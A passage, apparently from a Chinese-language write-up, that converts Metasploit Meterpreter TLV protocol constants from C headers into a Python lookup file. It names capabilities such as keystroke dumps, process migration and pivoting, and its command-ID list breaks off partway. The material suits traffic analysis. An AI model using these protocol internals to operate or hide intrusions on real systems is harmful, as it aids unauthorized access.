#define TLV_TYPE_VALUE_NAME            (TLV_META_TYPE_STRING  | 1010)
#define TLV_TYPE_VALUE_TYPE            (TLV_META_TYPE_UINT    | 1011)
#define TLV_TYPE_VALUE_DATA            (TLV_META_TYPE_RAW     | 1012)
#define TLV_TYPE_TARGET_HOST           (TLV_META_TYPE_STRING  | 1013)

/*
 * Config
 */
#define TLV_TYPE_COMPUTER_NAME         (TLV_META_TYPE_STRING  | 1040)
#define TLV_TYPE_OS_NAME               (TLV_META_TYPE_STRING  | 1041)
#define TLV_TYPE_USER_NAME             (TLV_META_TYPE_STRING  | 1042)
#define TLV_TYPE_ARCHITECTURE          (TLV_META_TYPE_STRING  | 1043)
#define TLV_TYPE_SID                   (TLV_META_TYPE_STRING  | 1045)
#define TLV_TYPE_LOCAL_DATETIME        (TLV_META_TYPE_STRING  | 1048)
#define TLV_TYPE_BUILD_TUPLE           (TLV_META_TYPE_STRING  | 1049)

/*
 * Environment
 */
#define TLV_TYPE_ENV_VARIABLE          (TLV_META_TYPE_STRING  | 1100)
#define TLV_TYPE_ENV_VALUE             (TLV_META_TYPE_STRING  | 1101)
#define TLV_TYPE_ENV_GROUP             (TLV_META_TYPE_GROUP   | 1102)

#define DELETE_KEY_FLAG_RECURSIVE      (1 << 0)

/*
 * Process
 */
#define TLV_TYPE_BASE_ADDRESS          (TLV_META_TYPE_QWORD   | 2000)
#define TLV_TYPE_ALLOCATION_TYPE       (TLV_META_TYPE_UINT    | 2001)
#define TLV_TYPE_PROTECTION            (TLV_META_TYPE_UINT    | 2002)
#define TLV_TYPE_PROCESS_PERMS         (TLV_META_TYPE_UINT    | 2003)
#define TLV_TYPE_PROCESS_MEMORY        (TLV_META_TYPE_RAW     | 2004)
#define TLV_TYPE_ALLOC_BASE_ADDRESS    (TLV_META_TYPE_QWORD   | 2005)
#define TLV_TYPE_MEMORY_STATE          (TLV_META_TYPE_UINT    | 2006)
#define TLV_TYPE_MEMORY_TYPE           (TLV_META_TYPE_UINT    | 2007)
#define TLV_TYPE_ALLOC_PROTECTION      (TLV_META_TYPE_UINT    | 2008)
#define TLV_TYPE_PID                   (TLV_META_TYPE_UINT    | 2300)
#define TLV_TYPE_PROCESS_NAME          (TLV_META_TYPE_STRING  | 2301)
#define TLV_TYPE_PROCESS_PATH          (TLV_META_TYPE_STRING  | 2302)
#define TLV_TYPE_PROCESS_GROUP         (TLV_META_TYPE_GROUP   | 2303)
#define TLV_TYPE_PROCESS_FLAGS         (TLV_META_TYPE_UINT    | 2304)
#define TLV_TYPE_PROCESS_ARGUMENTS     (TLV_META_TYPE_STRING  | 2305)
#define TLV_TYPE_PROCESS_ARCH          (TLV_META_TYPE_UINT    | 2306)
#define TLV_TYPE_PARENT_PID            (TLV_META_TYPE_UINT    | 2307)
#define TLV_TYPE_PROCESS_ARCH_NAME     (TLV_META_TYPE_STRING  | 2309)

#define TLV_TYPE_IMAGE_FILE            (TLV_META_TYPE_STRING  | 2400)
#define TLV_TYPE_IMAGE_FILE_PATH       (TLV_META_TYPE_STRING  | 2401)
#define TLV_TYPE_PROCEDURE_NAME        (TLV_META_TYPE_STRING  | 2402)
#define TLV_TYPE_PROCEDURE_ADDRESS     (TLV_META_TYPE_QWORD   | 2403)
#define TLV_TYPE_IMAGE_BASE            (TLV_META_TYPE_QWORD   | 2404)
#define TLV_TYPE_IMAGE_GROUP           (TLV_META_TYPE_GROUP   | 2405)
#define TLV_TYPE_IMAGE_NAME            (TLV_META_TYPE_STRING  | 2406)

#define TLV_TYPE_THREAD_ID             (TLV_META_TYPE_UINT    | 2500)
#define TLV_TYPE_THREAD_PERMS          (TLV_META_TYPE_UINT    | 2502)
#define TLV_TYPE_EXIT_CODE             (TLV_META_TYPE_UINT    | 2510)
#define TLV_TYPE_ENTRY_POINT           (TLV_META_TYPE_QWORD   | 2511)
#define TLV_TYPE_ENTRY_PARAMETER       (TLV_META_TYPE_QWORD   | 2512)
#define TLV_TYPE_CREATION_FLAGS        (TLV_META_TYPE_UINT    | 2513)

#define TLV_TYPE_REGISTER_NAME         (TLV_META_TYPE_STRING  | 2540)
#define TLV_TYPE_REGISTER_SIZE         (TLV_META_TYPE_UINT    | 2541)
#define TLV_TYPE_REGISTER_VALUE_32     (TLV_META_TYPE_UINT    | 2542)
#define TLV_TYPE_REGISTER              (TLV_META_TYPE_GROUP   | 2550)

#define TLV_TYPE_TERMINAL_ROWS         (TLV_META_TYPE_UINT    | 2600)
#define TLV_TYPE_TERMINAL_COLUMNS      (TLV_META_TYPE_UINT    | 2601)

/*
 * Memory
 */
#define TLV_TYPE_MEMORY_SEARCH_NEEDLE     (TLV_META_TYPE_STRING   | 2650)
#define TLV_TYPE_MEMORY_SEARCH_RESULTS    (TLV_META_TYPE_GROUP    | 2651)
#define TLV_TYPE_MEMORY_SEARCH_MATCH_LEN  (TLV_META_TYPE_UINT     | 2652)
#define TLV_TYPE_MEMORY_SEARCH_START_ADDR (TLV_META_TYPE_QWORD    | 2653)
#define TLV_TYPE_MEMORY_SEARCH_SECT_LEN   (TLV_META_TYPE_QWORD    | 2654)
#define TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR (TLV_META_TYPE_QWORD    | 2655)
#define TLV_TYPE_MEMORY_SEARCH_MATCH_STR  (TLV_META_TYPE_STRING   | 2656)

/*
 * Ui
 */
#define TLV_TYPE_IDLE_TIME             (TLV_META_TYPE_UINT    | 3000)
#define TLV_TYPE_KEYS_DUMP             (TLV_META_TYPE_STRING  | 3001)
#define TLV_TYPE_DESKTOP               (TLV_META_TYPE_STRING  | 3002)
#define TLV_TYPE_DESKTOP_SCREENSHOT         (TLV_META_TYPE_RAW  | 3002)
#define TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY (TLV_META_TYPE_UINT | 3008)
#define TLV_TYPE_KEYS_SEND             (TLV_META_TYPE_STRING  | 3014)
#define TLV_TYPE_MOUSE_ACTION          (TLV_META_TYPE_UINT    | 3015)
#define TLV_TYPE_MOUSE_X               (TLV_META_TYPE_UINT    | 3016)
#define TLV_TYPE_MOUSE_Y               (TLV_META_TYPE_UINT    | 3017)
#define TLV_TYPE_KEYEVENT_SEND         (TLV_META_TYPE_RAW     | 3018)

/*
 * Event Log
 */
#define TLV_TYPE_EVENT_SOURCENAME      (TLV_META_TYPE_STRING  | 4000)
#define TLV_TYPE_EVENT_HANDLE          (TLV_META_TYPE_QWORD   | 4001)
#define TLV_TYPE_EVENT_NUMRECORDS      (TLV_META_TYPE_UINT    | 4002)

#define TLV_TYPE_EVENT_READFLAGS       (TLV_META_TYPE_UINT    | 4003)
#define TLV_TYPE_EVENT_RECORDOFFSET    (TLV_META_TYPE_UINT    | 4004)

#define TLV_TYPE_EVENT_RECORDNUMBER    (TLV_META_TYPE_UINT    | 4006)
#define TLV_TYPE_EVENT_TIMEGENERATED   (TLV_META_TYPE_UINT    | 4007)
#define TLV_TYPE_EVENT_TIMEWRITTEN     (TLV_META_TYPE_UINT    | 4008)
#define TLV_TYPE_EVENT_ID              (TLV_META_TYPE_UINT    | 4009)
#define TLV_TYPE_EVENT_TYPE            (TLV_META_TYPE_UINT    | 4010)
#define TLV_TYPE_EVENT_CATEGORY        (TLV_META_TYPE_UINT    | 4011)
#define TLV_TYPE_EVENT_STRING          (TLV_META_TYPE_STRING  | 4012)
#define TLV_TYPE_EVENT_DATA            (TLV_META_TYPE_RAW     | 4013)

/*
 * Power
 */
#define TLV_TYPE_POWER_FLAGS           (TLV_META_TYPE_UINT    | 4100)
#define TLV_TYPE_POWER_REASON          (TLV_META_TYPE_UINT    | 4101)
```

每一个都有一些常量(如TLV_META_TYPE_STRING)，在上面的高两个字节中定义，在低字节中定义一个数字。将复制所有这些，并将其带入vim，并将其移动以生成一个Python文件:

 - msfconsts.py

``` python
TLV_META_TYPE_NONE         = 0
TLV_META_TYPE_STRING       = (1 << 16)
TLV_META_TYPE_UINT         = (1 << 17)
TLV_META_TYPE_RAW          = (1 << 18)
TLV_META_TYPE_BOOL         = (1 << 19)
TLV_META_TYPE_QWORD        = (1 << 20)
TLV_META_TYPE_COMPRESSED   = (1 << 29)
TLV_META_TYPE_GROUP        = (1 << 30)
TLV_META_TYPE_COMPLEX      = (1 << 31)

tlv_types = {}
tlv_types[(TLV_META_TYPE_NONE    | 0)] = "TLV_TYPE_ANY"
tlv_types[(TLV_META_TYPE_UINT    | 1)] = "TLV_TYPE_COMMAND_ID"
tlv_types[(TLV_META_TYPE_STRING  | 2)] = "TLV_TYPE_REQUEST_ID"
tlv_types[(TLV_META_TYPE_GROUP   | 3)] = "TLV_TYPE_EXCEPTION"
tlv_types[(TLV_META_TYPE_UINT    | 4)] = "TLV_TYPE_RESULT"
tlv_types[(TLV_META_TYPE_STRING  | 10)] = "TLV_TYPE_STRING"
tlv_types[(TLV_META_TYPE_UINT    | 11)] = "TLV_TYPE_UINT"
tlv_types[(TLV_META_TYPE_BOOL    | 12)] = "TLV_TYPE_BOOL"
tlv_types[(TLV_META_TYPE_UINT    | 25)] = "TLV_TYPE_LENGTH"
tlv_types[(TLV_META_TYPE_RAW     | 26)] = "TLV_TYPE_DATA"
tlv_types[(TLV_META_TYPE_UINT    | 27)] = "TLV_TYPE_FLAGS"
tlv_types[(TLV_META_TYPE_UINT    | 50)] = "TLV_TYPE_CHANNEL_ID"
tlv_types[(TLV_META_TYPE_STRING  | 51)] = "TLV_TYPE_CHANNEL_TYPE"
tlv_types[(TLV_META_TYPE_RAW     | 52)] = "TLV_TYPE_CHANNEL_DATA"
tlv_types[(TLV_META_TYPE_GROUP   | 53)] = "TLV_TYPE_CHANNEL_DATA_GROUP"
tlv_types[(TLV_META_TYPE_UINT    | 54)] = "TLV_TYPE_CHANNEL_CLASS"
tlv_types[(TLV_META_TYPE_UINT    | 55)] = "TLV_TYPE_CHANNEL_PARENTID"
tlv_types[(TLV_META_TYPE_UINT    | 70)] = "TLV_TYPE_SEEK_WHENCE"
tlv_types[(TLV_META_TYPE_UINT    | 71)] = "TLV_TYPE_SEEK_OFFSET"
tlv_types[(TLV_META_TYPE_UINT    | 72)] = "TLV_TYPE_SEEK_POS"
tlv_types[(TLV_META_TYPE_UINT    | 300)] = "TLV_TYPE_EXCEPTION_CODE"
tlv_types[(TLV_META_TYPE_STRING  | 301)] = "TLV_TYPE_EXCEPTION_STRING"
tlv_types[(TLV_META_TYPE_STRING  | 400)] = "TLV_TYPE_LIBRARY_PATH"
tlv_types[(TLV_META_TYPE_STRING  | 401)] = "TLV_TYPE_TARGET_PATH"
tlv_types[(TLV_META_TYPE_UINT    | 402)] = "TLV_TYPE_MIGRATE_PID"
tlv_types[(TLV_META_TYPE_UINT    | 403)] = "TLV_TYPE_MIGRATE_LEN"
tlv_types[(TLV_META_TYPE_UINT    | 430)] = "TLV_TYPE_TRANS_TYPE"
tlv_types[(TLV_META_TYPE_STRING  | 431)] = "TLV_TYPE_TRANS_URL"
tlv_types[(TLV_META_TYPE_STRING  | 432)] = "TLV_TYPE_TRANS_UA"
tlv_types[(TLV_META_TYPE_UINT    | 433)] = "TLV_TYPE_TRANS_COMM_TIMEOUT"
tlv_types[(TLV_META_TYPE_UINT    | 434)] = "TLV_TYPE_TRANS_SESSION_EXP"
tlv_types[(TLV_META_TYPE_RAW     | 435)] = "TLV_TYPE_TRANS_CERT_HASH"
tlv_types[(TLV_META_TYPE_STRING  | 436)] = "TLV_TYPE_TRANS_PROXY_HOST"
tlv_types[(TLV_META_TYPE_STRING  | 437)] = "TLV_TYPE_TRANS_PROXY_USER"
tlv_types[(TLV_META_TYPE_STRING  | 438)] = "TLV_TYPE_TRANS_PROXY_PASS"
tlv_types[(TLV_META_TYPE_UINT    | 439)] = "TLV_TYPE_TRANS_RETRY_TOTAL"
tlv_types[(TLV_META_TYPE_UINT    | 440)] = "TLV_TYPE_TRANS_RETRY_WAIT"
tlv_types[(TLV_META_TYPE_GROUP   | 441)] = "TLV_TYPE_TRANS_GROUP"
tlv_types[(TLV_META_TYPE_STRING  | 460)] = "TLV_TYPE_MACHINE_ID"
tlv_types[(TLV_META_TYPE_RAW     | 461)] = "TLV_TYPE_UUID"
tlv_types[(TLV_META_TYPE_RAW     | 462)] = "TLV_TYPE_SESSION_GUID"
tlv_types[(TLV_META_TYPE_RAW     | 550)] = "TLV_TYPE_RSA_PUB_KEY"
tlv_types[(TLV_META_TYPE_UINT    | 551)] = "TLV_TYPE_SYM_KEY_TYPE"
tlv_types[(TLV_META_TYPE_RAW     | 552)] = "TLV_TYPE_SYM_KEY"
tlv_types[(TLV_META_TYPE_RAW     | 553)] = "TLV_TYPE_ENC_SYM_KEY"
tlv_types[(TLV_META_TYPE_QWORD   | 600)] = "TLV_TYPE_HANDLE"
tlv_types[(TLV_META_TYPE_BOOL    | 601)] = "TLV_TYPE_INHERIT"
tlv_types[(TLV_META_TYPE_QWORD   | 630)] = "TLV_TYPE_PROCESS_HANDLE"
tlv_types[(TLV_META_TYPE_QWORD   | 631)] = "TLV_TYPE_THREAD_HANDLE"
tlv_types[(TLV_META_TYPE_STRING  | 1200)] = "TLV_TYPE_DIRECTORY_PATH"
tlv_types[(TLV_META_TYPE_STRING  | 1201)] = "TLV_TYPE_FILE_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 1202)] = "TLV_TYPE_FILE_PATH"
tlv_types[(TLV_META_TYPE_STRING  | 1203)] = "TLV_TYPE_FILE_MODE"
tlv_types[(TLV_META_TYPE_UINT    | 1204)] = "TLV_TYPE_FILE_SIZE"
tlv_types[(TLV_META_TYPE_RAW     | 1206)] = "TLV_TYPE_FILE_HASH"
tlv_types[(TLV_META_TYPE_COMPLEX | 1221)] = "TLV_TYPE_STAT_BUF"
tlv_types[(TLV_META_TYPE_BOOL    | 1230)] = "TLV_TYPE_SEARCH_RECURSE"
tlv_types[(TLV_META_TYPE_STRING  | 1231)] = "TLV_TYPE_SEARCH_GLOB"
tlv_types[(TLV_META_TYPE_STRING  | 1232)] = "TLV_TYPE_SEARCH_ROOT"
tlv_types[(TLV_META_TYPE_GROUP   | 1233)] = "TLV_TYPE_SEARCH_RESULTS"
tlv_types[(TLV_META_TYPE_UINT    | 1234)] = "TLV_TYPE_FILE_MODE_T"
tlv_types[(TLV_META_TYPE_UINT    | 1235)] = "TLV_TYPE_SEARCH_MTIME"
tlv_types[(TLV_META_TYPE_UINT    | 1236)] = "TLV_TYPE_SEARCH_M_START_DATE"
tlv_types[(TLV_META_TYPE_UINT    | 1237)] = "TLV_TYPE_SEARCH_M_END_DATE"
tlv_types[(TLV_META_TYPE_STRING  | 1400)] = "TLV_TYPE_HOST_NAME"
tlv_types[(TLV_META_TYPE_UINT    | 1401)] = "TLV_TYPE_PORT"
tlv_types[(TLV_META_TYPE_UINT    | 1402)] = "TLV_TYPE_INTERFACE_MTU"
tlv_types[(TLV_META_TYPE_STRING  | 1403)] = "TLV_TYPE_INTERFACE_FLAGS"
tlv_types[(TLV_META_TYPE_UINT    | 1404)] = "TLV_TYPE_INTERFACE_INDEX"
tlv_types[(TLV_META_TYPE_RAW     | 1420)] = "TLV_TYPE_SUBNET"
tlv_types[(TLV_META_TYPE_RAW     | 1421)] = "TLV_TYPE_NETMASK"
tlv_types[(TLV_META_TYPE_RAW     | 1422)] = "TLV_TYPE_GATEWAY"
tlv_types[(TLV_META_TYPE_GROUP   | 1423)] = "TLV_TYPE_NETWORK_ROUTE"
tlv_types[(TLV_META_TYPE_UINT    | 1424)] = "TLV_TYPE_IP_PREFIX"
tlv_types[(TLV_META_TYPE_GROUP   | 1425)] = "TLV_TYPE_ARP_ENTRY"
tlv_types[(TLV_META_TYPE_RAW     | 1430)] = "TLV_TYPE_IP"
tlv_types[(TLV_META_TYPE_RAW     | 1431)] = "TLV_TYPE_MAC_ADDRESS"
tlv_types[(TLV_META_TYPE_STRING  | 1432)] = "TLV_TYPE_MAC_NAME"
tlv_types[(TLV_META_TYPE_GROUP   | 1433)] = "TLV_TYPE_NETWORK_INTERFACE"
tlv_types[(TLV_META_TYPE_RAW     | 1434)] = "TLV_TYPE_IP6_SCOPE"
tlv_types[(TLV_META_TYPE_STRING  | 1440)] = "TLV_TYPE_SUBNET_STRING"
tlv_types[(TLV_META_TYPE_STRING  | 1441)] = "TLV_TYPE_NETMASK_STRING"
tlv_types[(TLV_META_TYPE_STRING  | 1442)] = "TLV_TYPE_GATEWAY_STRING"
tlv_types[(TLV_META_TYPE_UINT    | 1443)] = "TLV_TYPE_ROUTE_METRIC"
tlv_types[(TLV_META_TYPE_UINT    | 1444)] = "TLV_TYPE_ADDR_TYPE"
tlv_types[(TLV_META_TYPE_BOOL  | 1445)] = "TLV_TYPE_PROXY_CFG_AUTODETECT"
tlv_types[(TLV_META_TYPE_STRING| 1446)] = "TLV_TYPE_PROXY_CFG_AUTOCONFIGURL"
tlv_types[(TLV_META_TYPE_STRING| 1447)] = "TLV_TYPE_PROXY_CFG_PROXY"
tlv_types[(TLV_META_TYPE_STRING| 1448)] = "TLV_TYPE_PROXY_CFG_PROXYBYPASS"
tlv_types[(TLV_META_TYPE_STRING  | 1500)] = "TLV_TYPE_PEER_HOST"
tlv_types[(TLV_META_TYPE_UINT    | 1501)] = "TLV_TYPE_PEER_PORT"
tlv_types[(TLV_META_TYPE_STRING  | 1502)] = "TLV_TYPE_LOCAL_HOST"
tlv_types[(TLV_META_TYPE_UINT    | 1503)] = "TLV_TYPE_LOCAL_PORT"
tlv_types[(TLV_META_TYPE_UINT    | 1504)] = "TLV_TYPE_CONNECT_RETRIES"
tlv_types[(TLV_META_TYPE_GROUP   | 1505)] = "TLV_TYPE_NETSTAT_ENTRY"
tlv_types[(TLV_META_TYPE_RAW     | 1506)] = "TLV_TYPE_PEER_HOST_RAW"
tlv_types[(TLV_META_TYPE_RAW     | 1507)] = "TLV_TYPE_LOCAL_HOST_RAW"
tlv_types[(TLV_META_TYPE_UINT    | 1530)] = "TLV_TYPE_SHUTDOWN_HOW"
tlv_types[(TLV_META_TYPE_QWORD   | 1000)] = "TLV_TYPE_HKEY"
TLV_TYPE_HKEY = TLV_META_TYPE_QWORD   | 1000
tlv_types[(TLV_TYPE_HKEY)] = "TLV_TYPE_ROOT_KEY"
tlv_types[(TLV_META_TYPE_STRING  | 1001)] = "TLV_TYPE_BASE_KEY"
tlv_types[(TLV_META_TYPE_UINT    | 1002)] = "TLV_TYPE_PERMISSION"
tlv_types[(TLV_META_TYPE_STRING  | 1003)] = "TLV_TYPE_KEY_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 1010)] = "TLV_TYPE_VALUE_NAME"
tlv_types[(TLV_META_TYPE_UINT    | 1011)] = "TLV_TYPE_VALUE_TYPE"
tlv_types[(TLV_META_TYPE_RAW     | 1012)] = "TLV_TYPE_VALUE_DATA"
tlv_types[(TLV_META_TYPE_STRING  | 1013)] = "TLV_TYPE_TARGET_HOST"
tlv_types[(TLV_META_TYPE_STRING  | 1040)] = "TLV_TYPE_COMPUTER_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 1041)] = "TLV_TYPE_OS_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 1042)] = "TLV_TYPE_USER_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 1043)] = "TLV_TYPE_ARCHITECTURE"
tlv_types[(TLV_META_TYPE_STRING  | 1045)] = "TLV_TYPE_SID"
tlv_types[(TLV_META_TYPE_STRING  | 1048)] = "TLV_TYPE_LOCAL_DATETIME"
tlv_types[(TLV_META_TYPE_STRING  | 1049)] = "TLV_TYPE_BUILD_TUPLE"
tlv_types[(TLV_META_TYPE_STRING  | 1100)] = "TLV_TYPE_ENV_VARIABLE"
tlv_types[(TLV_META_TYPE_STRING  | 1101)] = "TLV_TYPE_ENV_VALUE"
tlv_types[(TLV_META_TYPE_GROUP   | 1102)] = "TLV_TYPE_ENV_GROUP"
tlv_types[(1 << 0)] = "DELETE_KEY_FLAG_RECURSIVE"
tlv_types[(TLV_META_TYPE_QWORD   | 2000)] = "TLV_TYPE_BASE_ADDRESS"
tlv_types[(TLV_META_TYPE_UINT    | 2001)] = "TLV_TYPE_ALLOCATION_TYPE"
tlv_types[(TLV_META_TYPE_UINT    | 2002)] = "TLV_TYPE_PROTECTION"
tlv_types[(TLV_META_TYPE_UINT    | 2003)] = "TLV_TYPE_PROCESS_PERMS"
tlv_types[(TLV_META_TYPE_RAW     | 2004)] = "TLV_TYPE_PROCESS_MEMORY"
tlv_types[(TLV_META_TYPE_QWORD   | 2005)] = "TLV_TYPE_ALLOC_BASE_ADDRESS"
tlv_types[(TLV_META_TYPE_UINT    | 2006)] = "TLV_TYPE_MEMORY_STATE"
tlv_types[(TLV_META_TYPE_UINT    | 2007)] = "TLV_TYPE_MEMORY_TYPE"
tlv_types[(TLV_META_TYPE_UINT    | 2008)] = "TLV_TYPE_ALLOC_PROTECTION"
tlv_types[(TLV_META_TYPE_UINT    | 2300)] = "TLV_TYPE_PID"
tlv_types[(TLV_META_TYPE_STRING  | 2301)] = "TLV_TYPE_PROCESS_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 2302)] = "TLV_TYPE_PROCESS_PATH"
tlv_types[(TLV_META_TYPE_GROUP   | 2303)] = "TLV_TYPE_PROCESS_GROUP"
tlv_types[(TLV_META_TYPE_UINT    | 2304)] = "TLV_TYPE_PROCESS_FLAGS"
tlv_types[(TLV_META_TYPE_STRING  | 2305)] = "TLV_TYPE_PROCESS_ARGUMENTS"
tlv_types[(TLV_META_TYPE_UINT    | 2306)] = "TLV_TYPE_PROCESS_ARCH"
tlv_types[(TLV_META_TYPE_UINT    | 2307)] = "TLV_TYPE_PARENT_PID"
tlv_types[(TLV_META_TYPE_STRING  | 2309)] = "TLV_TYPE_PROCESS_ARCH_NAME"
tlv_types[(TLV_META_TYPE_STRING  | 2400)] = "TLV_TYPE_IMAGE_FILE"
tlv_types[(TLV_META_TYPE_STRING  | 2401)] = "TLV_TYPE_IMAGE_FILE_PATH"
tlv_types[(TLV_META_TYPE_STRING  | 2402)] = "TLV_TYPE_PROCEDURE_NAME"
tlv_types[(TLV_META_TYPE_QWORD   | 2403)] = "TLV_TYPE_PROCEDURE_ADDRESS"
tlv_types[(TLV_META_TYPE_QWORD   | 2404)] = "TLV_TYPE_IMAGE_BASE"
tlv_types[(TLV_META_TYPE_GROUP   | 2405)] = "TLV_TYPE_IMAGE_GROUP"
tlv_types[(TLV_META_TYPE_STRING  | 2406)] = "TLV_TYPE_IMAGE_NAME"
tlv_types[(TLV_META_TYPE_UINT    | 2500)] = "TLV_TYPE_THREAD_ID"
tlv_types[(TLV_META_TYPE_UINT    | 2502)] = "TLV_TYPE_THREAD_PERMS"
tlv_types[(TLV_META_TYPE_UINT    | 2510)] = "TLV_TYPE_EXIT_CODE"
tlv_types[(TLV_META_TYPE_QWORD   | 2511)] = "TLV_TYPE_ENTRY_POINT"
tlv_types[(TLV_META_TYPE_QWORD   | 2512)] = "TLV_TYPE_ENTRY_PARAMETER"
tlv_types[(TLV_META_TYPE_UINT    | 2513)] = "TLV_TYPE_CREATION_FLAGS"
tlv_types[(TLV_META_TYPE_STRING  | 2540)] = "TLV_TYPE_REGISTER_NAME"
tlv_types[(TLV_META_TYPE_UINT    | 2541)] = "TLV_TYPE_REGISTER_SIZE"
tlv_types[(TLV_META_TYPE_UINT    | 2542)] = "TLV_TYPE_REGISTER_VALUE_32"
tlv_types[(TLV_META_TYPE_GROUP   | 2550)] = "TLV_TYPE_REGISTER"
tlv_types[(TLV_META_TYPE_UINT    | 2600)] = "TLV_TYPE_TERMINAL_ROWS"
tlv_types[(TLV_META_TYPE_UINT    | 2601)] = "TLV_TYPE_TERMINAL_COLUMNS"
tlv_types[(TLV_META_TYPE_STRING   | 2650)] = "TLV_TYPE_MEMORY_SEARCH_NEEDLE"
tlv_types[(TLV_META_TYPE_GROUP    | 2651)] = "TLV_TYPE_MEMORY_SEARCH_RESULTS"
tlv_types[(TLV_META_TYPE_UINT     | 2652)] = "TLV_TYPE_MEMORY_SEARCH_MATCH_LEN"
tlv_types[(TLV_META_TYPE_QWORD    | 2653)] = "TLV_TYPE_MEMORY_SEARCH_START_ADDR"
tlv_types[(TLV_META_TYPE_QWORD    | 2654)] = "TLV_TYPE_MEMORY_SEARCH_SECT_LEN"
tlv_types[(TLV_META_TYPE_QWORD    | 2655)] = "TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR"
tlv_types[(TLV_META_TYPE_STRING   | 2656)] = "TLV_TYPE_MEMORY_SEARCH_MATCH_STR"
tlv_types[(TLV_META_TYPE_UINT    | 3000)] = "TLV_TYPE_IDLE_TIME"
tlv_types[(TLV_META_TYPE_STRING  | 3001)] = "TLV_TYPE_KEYS_DUMP"
tlv_types[(TLV_META_TYPE_STRING  | 3002)] = "TLV_TYPE_DESKTOP"
tlv_types[(TLV_META_TYPE_RAW  | 3002)] = "TLV_TYPE_DESKTOP_SCREENSHOT"
tlv_types[(TLV_META_TYPE_UINT | 3008)] = "TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY"
tlv_types[(TLV_META_TYPE_STRING  | 3014)] = "TLV_TYPE_KEYS_SEND"
tlv_types[(TLV_META_TYPE_UINT    | 3015)] = "TLV_TYPE_MOUSE_ACTION"
tlv_types[(TLV_META_TYPE_UINT    | 3016)] = "TLV_TYPE_MOUSE_X"
tlv_types[(TLV_META_TYPE_UINT    | 3017)] = "TLV_TYPE_MOUSE_Y"
tlv_types[(TLV_META_TYPE_RAW     | 3018)] = "TLV_TYPE_KEYEVENT_SEND"
tlv_types[(TLV_META_TYPE_STRING  | 4000)] = "TLV_TYPE_EVENT_SOURCENAME"
tlv_types[(TLV_META_TYPE_QWORD   | 4001)] = "TLV_TYPE_EVENT_HANDLE"
tlv_types[(TLV_META_TYPE_UINT    | 4002)] = "TLV_TYPE_EVENT_NUMRECORDS"
tlv_types[(TLV_META_TYPE_UINT    | 4003)] = "TLV_TYPE_EVENT_READFLAGS"
tlv_types[(TLV_META_TYPE_UINT    | 4004)] = "TLV_TYPE_EVENT_RECORDOFFSET"
tlv_types[(TLV_META_TYPE_UINT    | 4006)] = "TLV_TYPE_EVENT_RECORDNUMBER"
tlv_types[(TLV_META_TYPE_UINT    | 4007)] = "TLV_TYPE_EVENT_TIMEGENERATED"
tlv_types[(TLV_META_TYPE_UINT    | 4008)] = "TLV_TYPE_EVENT_TIMEWRITTEN"
tlv_types[(TLV_META_TYPE_UINT    | 4009)] = "TLV_TYPE_EVENT_ID"
tlv_types[(TLV_META_TYPE_UINT    | 4010)] = "TLV_TYPE_EVENT_TYPE"
tlv_types[(TLV_META_TYPE_UINT    | 4011)] = "TLV_TYPE_EVENT_CATEGORY"
tlv_types[(TLV_META_TYPE_STRING  | 4012)] = "TLV_TYPE_EVENT_STRING"
tlv_types[(TLV_META_TYPE_RAW     | 4013)] = "TLV_TYPE_EVENT_DATA"
tlv_types[(TLV_META_TYPE_UINT    | 4100)] = "TLV_TYPE_POWER_FLAGS"
tlv_types[(TLV_META_TYPE_UINT    | 4101)] = "TLV_TYPE_POWER_REASON"

cmd_ids = {}

cmd_ids[1] = "CORE_CHANNEL_CLOSE"
cmd_ids[2] = "CORE_CHANNEL_EOF"
cmd_ids[3] = "CORE_CHANNEL_INTERACT"
cmd_ids[4] = "CORE_CHANNEL_OPEN"
cmd_ids[5] = "CORE_CHANNEL_READ"
cmd_ids[6] = "CORE_CHANNEL_SEEK"
cmd_ids[7] = "CORE_CHANNEL_TELL"
cmd_ids[8] = "CORE_CHANNEL_WRITE"
cmd_ids[9] = "CORE_CONSOLE_WRITE"
cmd_ids[10] = "CORE_ENUMEXTCMD"
cmd_ids[11] = "CORE_GET_SESSION_GUID"
cmd_ids[12] = "CORE_LOADLIB"
cmd_ids[13] = "CORE_MACHINE_ID"
cmd_ids[14] = "CORE_MIGRATE"
cmd_ids[15] = "CORE_NATIVE_ARCH"
cmd_ids[16] = "CORE_NEGOTIATE_TLV_ENCRYPTION"
cmd_ids[17] = "CORE_PATCH_URL"
cmd_ids[18] = "CORE_PIVOT_ADD"
cmd_ids[19] = "CORE_PIVOT_REMOVE"
cmd_ids[20] = "CORE_PIVOT_SESSION_DIED"
cmd_ids[21] = "CORE_SET_SESSION_GUID"
cmd_ids[22] = "CORE_SET_UUID"
cmd_ids[23] = "CORE_SHUTDOWN"
cmd_ids[24] = "CORE_TRANSPORT_ADD"
cmd_ids[25] = "CORE_TRANSPORT_CHANGE"
cmd_ids[26] = "CORE_TRANSPORT_GETCERTHASH"
cmd_ids[27] = "CORE_TRANSPORT_LIST"
cmd_ids[28] = "CORE_TRANSPORT_NEXT"
cmd_ids[29] = "CORE_TRANSPORT_PREV"
cmd_ids[30] = "CORE_TRANSPORT_REMOVE"
cmd_ids[31] = "CORE_TRANSPORT_SETCERTHASH"
cmd_ids[32] = "CORE_TRANSPORT_SET_TIMEOUTS"
cmd_ids[33] = "CORE_TRANSPORT_SLEEP"
cmd_ids[1001] = "STDAPI_FS_CHDIR"
cmd_ids[1002] = "STDAPI_FS_CHMOD"
cmd_ids[1003] = "STDAPI_FS_DELETE_DIR"
cmd_ids[1004] = "STDAPI_FS_DELETE_FILE"
cmd_ids[1005] = "STDAPI_FS_FILE_COPY"
cmd_ids[1006] = "STDAPI_FS_FILE_EXPAND_PATH"
cmd_ids[1007] = "STDAPI_FS_FILE_MOVE"
cmd_ids[1008] = "STDAPI_FS_GETWD"
cmd_ids[1009] = "STDAPI_FS_LS"
cmd_ids[1010] = "STDAPI_FS_MD5"
cmd_ids[1011] = "STDAPI_FS_MKDIR"
cmd_ids[1012] = "STDAPI_FS_MOUNT_SHOW"
cmd_ids[1013] = "STDAPI_FS_SEARCH"
